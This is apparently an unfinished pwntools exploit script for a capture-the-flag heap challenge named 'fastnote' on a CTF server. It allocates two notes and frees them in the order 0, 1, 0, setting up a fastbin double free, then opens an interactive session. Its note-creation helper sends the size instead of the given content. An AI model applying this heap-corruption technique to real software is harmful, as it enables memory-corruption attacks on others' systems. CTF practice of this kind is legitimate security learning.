#!/usr/bin/env python2
import sys, time

from pwn import *

file = './fastnote'
# server, port = 'localhost'  , 9999
server, port = 'csie.ctf.tw', 10133

r, context.binary = remote(server, port), file
# ========================================================================
file_elf, libc_elf = ELF( file ), ELF("libc-2.23.so")

# menu:
# "1. new note
# "2. print note
# "3. delete note
# "4. exit
# "choice>

def menu_new(size, content):
    r.sendlineafter( 'choice> ' , '1'       )
    r.sendlineafter( 'size: '   , str(size) )
    r.sendlineafter( 'content: ', str(size) )

def menu_print(idx):
    r.sendlineafter( 'choice> ' , '2'       )
    r.sendlineafter( 'index: '  , str(idx)  )

def menu_delete(idx):
    r.sendlineafter( 'choice> ' , '3'       )
    r.sendlineafter( 'index: '  , str(idx)  )

r.recvuntil( "Welcome to Fast Note!\n", drop= True )

menu_new( 0x68, 'a' )
menu_new( 0x68, 'a' )
menu_delete( 0 )
menu_delete( 1 )
menu_delete( 0 )

print r.recv( )

r.interactive()
